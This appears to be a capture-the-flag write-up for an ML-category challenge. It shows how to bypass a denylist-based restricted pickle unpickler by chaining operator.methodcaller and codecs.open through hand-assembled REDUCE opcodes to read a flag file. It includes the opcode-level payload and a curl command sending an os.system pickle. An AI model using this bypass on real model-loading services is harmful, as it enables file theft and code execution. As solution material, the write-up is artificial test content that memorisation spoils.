<!-- nctf-meta category="ml" difficulty="medium" points="350" author="dagbanjaphet" stub="0" -->

# pickle-rce

## TL;DR

The "model registry" deserializes an uploaded pickle inside a denylist-based
`RestrictedUnpickler`. The denylist inspects only the classes named by `GLOBAL`
opcodes and blocks the obvious RCE modules (`os`, `subprocess`, `sys`,
`builtins`, `importlib`) plus every one-shot file reader (`linecache`, `gzip`,
`pathlib`, ...). It does **not** constrain what an allowed callable does, nor how
many callables you chain on the pickle stack. Chain two survivors --
`codecs.open` (or `io.open`) and `operator.methodcaller("read")` -- to read
`/flag`. The service returns `repr(loaded_object)`, which is the flag.

## Recon

`GET /` and the handout describe a `POST /validate` that loads a pickle and
returns a summary. The benign `example_model.pkl` round-trips to
`{"status":"ok", "model_summary":"{...}"}`.

The interesting bit: rejected classes come back verbose:

```
$ python3 -c "import pickle,os,sys;sys.stdout.buffer.write(pickle.dumps(type('E',(),{'__reduce__':lambda s:(os.system,('id',))})()))" \
    | curl -s --data-binary @- http://HOST:PORT/validate
{"status":"rejected","reason":"class not allowed: posix.system (module 'posix' is blocked)"}
```

So it is a `find_class` guard, it is a **denylist**, and it names the module that
tripped it. Probe it:

- `os`, `posix`, `subprocess`, `sys`, `builtins`, `importlib` -> blocked.
- `builtins.open` pickles as `io.open`; `io` is **not** blocked, but it returns a
  _file object_, not the file's contents.
- one-shot readers that would hand you the contents in a single reduce
  (`linecache.getlines`, `gzip.open`+read, `pathlib.Path.read_text`, ...) are all
  blocked. That is the hint: the author blocked the single-call reads, so you
  must do open-then-read yourself.

## The idea

`REDUCE` pops `(callable, argtuple)` off the stack and pushes `callable(*args)`.
The `callable` can be **any object already on the stack**, not just a freshly
imported GLOBAL. So build the pieces and combine them:

```python
mc = operator.methodcaller("read")   # a callable; mc(x) == x.read()
f  = codecs.open("/flag")            # an open text file (default mode "r")
result = mc(f)                       # == f.read() == the flag text
```

Every GLOBAL used (`operator.methodcaller`, `codecs.open`) is on an allowed
module, so `find_class` is happy. The three `REDUCE`s run inside `pickle.load`
before the guard can care what they _did_.

## The pickle

Assembled by hand at the opcode level (see `solve.py`):

```
c operator\nmethodcaller\n   GLOBAL  -> push operator.methodcaller
\x8c\x04 read                SHORT_BINUNICODE "read"
\x85                         TUPLE1  -> ("read",)
R                            REDUCE  -> mc = methodcaller("read")
c codecs\nopen\n             GLOBAL  -> push codecs.open
\x8c\x05 /flag               SHORT_BINUNICODE "/flag"
\x85                         TUPLE1  -> ("/flag",)
R                            REDUCE  -> f = codecs.open("/flag")
\x85                         TUPLE1  -> (f,)
R                            REDUCE  -> mc(f) == f.read()
.                            STOP
```

## Run it

```
$ python3 solve.py http://HOST:PORT
service response: {
  "loaded_type": "str",
  "model_summary": "'NCTF{…}\\n'",
  "status": "ok",
  "truncated": false
}

FLAG: NCTF{…}
```

`operator.attrgetter("read")` + an extra call, or `io.open` in place of
`codecs.open`, work identically -- any allowed open-then-read chain does.

## Decoy

`/flag.decoy` holds `NCTF{…}`. Point
the same chain at `/flag.decoy` once and you can read that it is a labelled
placeholder. It is not the flag; do not submit it. Ruling it out costs nothing.

## Honest note on LLM assistance

"Pickle `__reduce__` gives RCE" is textbook and an LLM will produce the naive
`os.system` payload instantly -- which is **rejected** here. The challenge's
friction is threefold and is where a one-prompt answer fails: (1) recognising
from the rejection messages that it is a _denylist_ and enumerating what survives
(specifically that the single-call file readers are blocked but `codecs`/`io`
/`operator` are not); (2) knowing that pickle's `REDUCE` invokes _any_ stack
object, so callables can be chained; and (3) hand-assembling a multi-`REDUCE`
pickle at the opcode level, since `pickletools`/`pickle` will not emit this shape
for you from ordinary objects. An LLM used as a reasoning assistant will get
there with iteration -- probe, read errors, adjust -- but not in a single shot,
and the server-side oracle (flag only exists in the instance, only returned if
your object _is_ it) means offline brute force is useless.
